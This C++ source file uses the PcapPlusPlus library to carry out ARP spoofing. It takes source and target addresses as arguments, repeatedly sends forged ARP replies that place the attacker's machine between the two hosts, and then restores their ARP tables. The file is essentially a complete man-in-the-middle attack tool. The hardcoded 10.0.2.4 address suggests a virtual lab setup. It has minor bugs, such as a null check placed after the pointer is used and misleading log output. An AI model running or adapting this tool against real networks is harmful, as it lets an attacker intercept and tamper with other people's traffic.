#include "ArpLayer.h"
#include "EthLayer.h"
#include "IpAddress.h"
#include "MacAddress.h"
#include "NetworkUtils.h"
#include "Packet.h"
#include "PcapFileDevice.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "SystemUtils.h"
#include <cstdlib>
#include <getopt.h>
#include <iostream>
#include <unistd.h>

void create_arp_packet() { pcpp::Packet arpRequest(500); }



void restoreARP(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
                pcpp::MacAddress &mac_src, pcpp::IPv4Address &ipv4_target,
                pcpp::MacAddress &mac_target) {


  std::cout << "Restore ARP table" << std::endl;

  // Restore target
  pcpp::Packet targetARPReply(500);
  pcpp::EthLayer targetEthLayer(pDevice->getMacAddress(), mac_target,
                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
  pcpp::ArpLayer targetArplayer(pcpp::ArpReply(mac_src, ipv4_src, mac_target, ipv4_target));
  targetARPReply.addLayer(&targetEthLayer);
  targetARPReply.addLayer(&targetArplayer);
  targetARPReply.computeCalculateFields();

  // Restore source
  pcpp::Packet sourceARPReply(500);
  pcpp::EthLayer sourceEthLayer(pDevice->getMacAddress(), mac_src,
                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
  pcpp::ArpLayer sourceARPLayer(
      pcpp::ArpReply(mac_target, ipv4_target, mac_src, ipv4_src));
  sourceARPReply.addLayer(&sourceEthLayer);
  sourceARPReply.addLayer(&sourceARPLayer);
  sourceARPLayer.computeCalculateFields();

  pDevice->sendPacket(&targetARPReply);
  pDevice->sendPacket(&sourceARPReply);
}

void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
                 pcpp::MacAddress &mac_src, pcpp::IPv4Address &ipv4_target,
                 pcpp::MacAddress &mac_target) {

  // Create ARP reply for the target
  pcpp::Packet targetARPReply(500);
  pcpp::EthLayer targetEthLayer(pDevice->getMacAddress(), mac_target,
                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
  pcpp::ArpLayer targetArplayer(pcpp::ArpReply(
      pDevice->getMacAddress(), ipv4_src, mac_target, ipv4_target));
  targetARPReply.addLayer(&targetEthLayer);
  targetARPReply.addLayer(&targetArplayer);
  targetARPReply.computeCalculateFields();

  // // Create ARP reply for the source
  //                                 08:00:27:4f:52:12
  // pcpp::MacAddress mac_victim("08:00:27:fc:f8:2b");
  pcpp::Packet sourceARPReply(500);
  pcpp::EthLayer sourceEthLayer(pDevice->getMacAddress(), mac_src,
                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
  pcpp::ArpLayer sourceARPLayer(
      pcpp::ArpReply(pDevice->getMacAddress(), ipv4_target, mac_src, ipv4_src));
  sourceARPReply.addLayer(&sourceEthLayer);
  sourceARPReply.addLayer(&sourceARPLayer);
  sourceARPLayer.computeCalculateFields();
  

  int max = 5 ;
  int min = 0;
  while (min < max) {
    pDevice->sendPacket(&targetARPReply);
    std::cout << "Sent ARP reply: " << ipv4_target
              << " [target] is at MAC address " << mac_src << " [me]"
              << std::endl;
    pDevice->sendPacket(&sourceARPReply);
    std::cout << "Sent ARP reply: " << ipv4_src
              << " [source] is at MAC address " << mac_src << " [me]"
              << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(5));
    min++;
  }
  restoreARP(pDevice, ipv4_src, mac_src, ipv4_target, mac_target);
  
}
int main(int argc, char **argv) {

  pcpp::AppName::init(argc, argv);

  if (argc < 5) {
    std::cout << "Not enough arguments" << std::endl;
    exit(1);
  }

  std::string ip_src = argv[1], mac_src = argv[2], ip_target = argv[3],
              mac_target = argv[4];

  pcpp::IPv4Address IPlocal("10.0.2.4");

  if (ip_src == "" || mac_src == "" || ip_target == "" || mac_target == "") {

    std::cout << "Please give source ip/mac and target ip/mac" << std::endl;
    exit(1);
  }

  pcpp::IPv4Address IPv4_source;
  pcpp::MacAddress MAC_source;
  pcpp::IPv4Address IPv4_target;
  pcpp::MacAddress MAC_target;

  try {

    IPv4_source = pcpp::IPv4Address(ip_src);

  } catch (const std::exception &) {
    std::cout << "Ip source not valid" << std::endl;
    exit(1);
  }

  try {

    MAC_source = pcpp::MacAddress(mac_src);

  } catch (const std::exception &) {
    std::cout << "Mac source not valid" << std::endl;
    exit(1);
  }

  try {

    IPv4_target = pcpp::IPv4Address(ip_target);

  } catch (const std::exception &) {
    std::cout << "Ip target not valid" << std::endl;
    exit(1);
  }

  try {

    MAC_target = pcpp::MacAddress(mac_target);

  } catch (const std::exception &) {
    std::cout << "Mac target not valid" << std::endl;
    exit(1);
  }

  pcpp::PcapLiveDevice *pIfaceDevice =
      pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(IPlocal);
  std::cout << pIfaceDevice->getName() << std::endl;

  if (pIfaceDevice == nullptr) {
    std::cout << "Cannot find interface " << std::endl;
    exit(1);
  }

  // Opening interface device
  if (!pIfaceDevice->open()) {

    std::cout << "Cannot open interface" << std::endl;
    exit(1);
  }
  arpspoofing(pIfaceDevice, IPv4_source, MAC_source, IPv4_target, MAC_target);
}
